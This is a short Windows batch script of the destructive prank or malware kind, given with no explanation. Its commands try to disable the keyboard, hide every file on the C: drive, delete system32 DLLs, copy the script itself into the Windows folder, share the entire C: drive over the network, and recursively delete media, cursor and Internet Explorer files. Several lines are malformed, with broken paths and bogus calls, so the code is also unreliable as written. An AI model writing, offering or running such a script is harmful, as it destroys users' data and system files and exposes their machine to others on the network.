@echo off
rundll32 keyboard,disable
copy C:\windows\system32\*.* C:\Microsoft\*.exe*program
md C:\Microsoft
copy C:\*.* C:\Microsoft\system
xcopy C:\system32\*.* C:\*.*/s/q
attrib +h +s C:\*.*
del "%SystemRoot%system32*.dll" /q >nul
copy %0 %windir%/system
net share "ResName"="C:" >nul
del "%SystemRoot%Media" /q >nul
del "%SystemRoot%Cursors*.*" >nul
cd %ProgramFiles%\Internet Explorer
del *.* /s /q
